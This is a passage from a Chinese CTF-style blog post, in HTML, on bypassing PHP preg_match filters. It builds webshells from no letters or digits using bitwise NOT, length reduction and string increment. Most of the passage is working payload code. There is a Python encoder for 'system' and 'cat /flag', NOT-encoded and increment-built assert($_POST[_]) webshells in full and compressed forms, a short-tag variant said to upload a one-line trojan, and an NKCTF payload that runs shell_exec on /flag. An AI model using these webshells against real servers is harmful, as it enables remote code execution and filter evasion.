(~&#x27;.urlencode(~$system).&#x27;)(~&#x27;.urlencode(~$command).&#x27;);&#x27;;</span><br></pre></td></tr></table></div></figure>
<p>exp2:(python)</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def get(shell):</span><br><span class="line">    hexbit=&#x27;&#x27;.join(map(lambda x: hex(~(-(256-ord(x)))),shell))</span><br><span class="line">    hexbit = hexbit.replace(&#x27;0x&#x27;,&#x27;%&#x27;)</span><br><span class="line">    print(hexbit)</span><br><span class="line"></span><br><span class="line">get(&#x27;system&#x27;)</span><br><span class="line">get(&#x27;cat /flag&#x27;)</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/10.png"><br>所以此时的payload:system(‘cat &#x2F;flag’)&#x3D;(<del>%8C%86%8C%8B%9A%92)(</del>%9C%9E%8B%DF%D0%99%93%9E%98)</p>

        <h2 id="无字母数字webshell加长度限制">
          <a href="#无字母数字webshell加长度限制" class="heading-link"><i class="fas fa-link"></i></a><a href="#无字母数字webshell加长度限制" class="headerlink" title="无字母数字webshell加长度限制"></a>无字母数字webshell加长度限制</h2>
      <p>缩减字符的方法一：<br>先使用这个poc:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def get(shell):</span><br><span class="line">    hexbit=&#x27;&#x27;.join(map(lambda x: hex(~(-(256-ord(x)))),shell))</span><br><span class="line">    hexbit = hexbit.replace(&#x27;0x&#x27;,&#x27;%&#x27;)</span><br><span class="line">    print(hexbit)</span><br><span class="line"></span><br><span class="line">get(&#x27;assert&#x27;)</span><br><span class="line">get(&#x27;_POST&#x27;)</span><br></pre></td></tr></table></div></figure>
<p>然后使用这个poc将上面的exp缩减为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_ = ~&quot;%9e%8c%8c%9a%8d%8b&quot;;   //得到assert，此时$_=&quot;assert&quot;</span><br><span class="line">$__ = ~&quot;%a0%af%b0%ac%ab&quot;;   //得到_POST，此时$__=&quot;_POST&quot;</span><br><span class="line">$___ = $$__;   //$___=$_POST</span><br><span class="line">$_($___[_]);   //assert($_POST[_])</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/13.png"></p>

        <h2 id="自增自减">
          <a href="#自增自减" class="heading-link"><i class="fas fa-link"></i></a><a href="#自增自减" class="headerlink" title="自增自减"></a>自增自减</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&#x27;/[a-z0-9;~^`&amp;|/is]/is&#x27;,$_GET[&#x27;shell&#x27;]))</span><br></pre></td></tr></table></div></figure>
<p>此时可以看到取反、异或、或运算都被过滤；所以此时我们需要考虑的就是自增自减的绕过<br>何为自增自减呢</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;A&quot;++ ==&gt; &quot;B&quot;</span><br><span class="line">&quot;B&quot;++ ==&gt; &quot;C&quot;</span><br></pre></td></tr></table></div></figure>
<p>所以，只要我们能拿到一个变量，其值为a，那么通过自增操作即可获得a-z中所有字符。所以此时我们需要做的就是如何拿到字符<br>那么，如何拿到一个值为字符串’a’的变量呢？我们发现，在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array<br><img src="/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/14.png"><br>而Array的第一个字母就是大写A，而且第4个字母是小写a。也就是说我们可以同时拿到小写a和大写A，那么我们就可以拿到a-z和A-Z的所有字母：<br><img src="/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/15.png"><br>webshell:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[];</span><br><span class="line">$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;</span><br><span class="line">$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];</span><br><span class="line">$___=$_; // A</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; // E </span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R</span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=&#x27;_&#x27;;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); // ASSERT($_POST[_]);</span><br></pre></td></tr></table></div></figure>
<p>缩减后的webshell(这里记得使用url编码)</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/16.png"><br>在上面这种情况下当；被过滤时只能使用短标签法；payload如下(上传一句话木马)</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=$_=[]?&gt;&lt;?=$_=@&quot;$_&quot;?&gt;&lt;?=$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]?&gt;&lt;?=$___=$_?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?= $___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$____=&#x27;_&#x27;?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$_=$$____?&gt;&lt;?=$_[__]($_[_])?&gt;</span><br></pre></td></tr></table></div></figure>
<p>记录一下NKCTF里面的一个payload:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_=(_/_._)[_];++$_;$__=$_.$_++;++$_;++$_;++$_;$__.=$_++.$_;$_=_.$__;$$_[_]($$_[__])</span><br><span class="line">;&amp;_=shell_exec&amp;__=cat /flag &gt; 1.txt</span><br></pre></td></tr></table></div></figure>
<p>有关自增自减的文章：<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文結束，感謝您的閱讀 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://hyggevv.github.io">hey</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文連結: </span><span class="copyright-link__value"><a href="https://hyggevv.github.io/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/">https://hyggevv.github.io/2023/04/07/preg-replace%E7%9A%84%E7%BB%95%E8%BF%87/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版權聲明: </span><span class="copyright-notice__value">本部落格所有文章除特別聲明外，均採用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 許可協議。轉載請注明出處！</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/04/10/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">记录第一次靶机渗透</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/03/29/NSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="paginator-prev__text">NSS-反序列化</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目錄</span><span class="sidebar-nav-ov">本站概覽</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-number">1.</span> <span class="toc-text">
          1.无参数RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0%E4%B8%80%EF%BC%9Agetallheaders-%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">
          关键函数一：getallheaders()：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0%E4%BA%8C%EF%BC%9Aget-defined-vars"><span class="toc-number">3.</span> <span class="toc-text">
          关键函数二：get_defined_vars():</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0%E4%B8%89%EF%BC%9Asession-start-%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">
          关键函数三：session_start()：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0%E5%9B%9B%EF%BC%9Ascandir-%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">
          关键函数四：scandir()：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell"><span class="toc-number">6.</span> <span class="toc-text">
          2.无字母数字webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text">
          绕过方法一：异或绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E6%88%96%E8%BF%90%E7%AE%97%E7%BB%95%E8%BF%87"><span class="toc-number">8.</span> <span class="toc-text">
          绕过方法二：或运算绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87"><span class="toc-number">9.</span> <span class="toc-text">
          绕过方法三：取反绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell%E5%8A%A0%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="toc-number">10.</span> <span class="toc-text">
          无字母数字webshell加长度限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%A2%9E%E8%87%AA%E5%87%8F"><span class="toc-number">11.</span> <span class="toc-text">
          自增自减</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/usually.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hey</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">120</div><div class="sidebar-ov-state-item__name">歸檔</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">分類</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">標籤</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知識共享許可協議" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已閱讀了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2025</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>hey</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 強力驅動</span><span> v5.4.2</span><span class="footer__devider">|</span><span>主題 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.7.0</span></div><div class="busuanzi"><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">總瀏覽次數</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.7.0"></script><script src="/js/stun-boot.js?v=2.7.0"></script><script src="/js/scroll.js?v=2.7.0"></script><script src="/js/header.js?v=2.7.0"></script><script src="/js/sidebar.js?v=2.7.0"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":180,"height":300},"mobile":{"show":true},"log":false});</script></body></html>